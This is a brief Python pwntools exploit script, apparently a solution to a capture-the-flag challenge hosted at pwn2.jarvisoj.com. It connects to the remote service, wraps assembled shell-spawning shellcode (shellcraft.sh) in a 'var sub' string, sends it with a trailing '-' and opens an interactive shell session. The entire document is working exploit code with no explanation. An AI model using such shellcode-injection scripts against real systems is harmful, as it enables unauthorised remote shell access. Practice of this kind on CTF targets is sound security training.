from pwn import *
r = remote('pwn2.jarvisoj.com',9892)
payload = 'var sub = \"'+asm(shellcraft.sh())+'\"'
r.recvuntil('>')
r.sendline(payload)
r.sendline('-')
r.interactive()